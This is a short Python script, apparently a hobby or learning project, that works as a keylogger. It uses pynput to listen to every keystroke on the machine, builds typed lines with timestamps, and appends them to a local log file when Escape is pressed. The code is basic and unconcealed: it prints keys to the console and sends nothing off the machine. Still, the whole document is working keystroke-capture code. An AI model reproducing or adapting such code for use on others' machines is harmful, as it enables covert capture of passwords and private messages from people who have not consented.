from pynput import keyboard
import datetime


newKeys = ""
log = []


# def get_key_name(key):
# 	if isinstance(key, keyboard.KeyCode):
# 		return key.char
# 	else:
# 		return str(key)

def on_press(key):



	if isinstance(key, keyboard.KeyCode):
		global newKeys
		currentKey = str(key.char)  # force it to be a string
		print("Key {} pressed.".format(currentKey))
		newKeys = newKeys + currentKey

	elif (str(key) == "Key.space"):
		newKeys = newKeys + " "

	elif (str(key) == "Key.enter" and len(newKeys) > 0):
		global log
		newKeys = newKeys + " "
		timestamp = datetime.datetime.now().timestamp()
		newKeys = newKeys + '\n' + datetime.datetime.fromtimestamp(timestamp).isoformat()
		log.append(newKeys)
		print(log)
		newKeys = ""

	elif (str(key) == "Key.esc"):
		with open('logs/log.txt', 'a') as f:
			for ele in log:
				f.write(ele + '\n')
		log = [];

	else:
		print("Key {} pressed.".format(str(key)))


# with open('filename.txt','a') as f:




def on_release(key):
	print("Key {} released.".format(key))
	# if str(key) == 'key.esc':
	# 	print("Exiting...")
	# 	return False

with keyboard.Listener(
	on_press = on_press,
	on_release = on_release) as listener:
	listener.join()
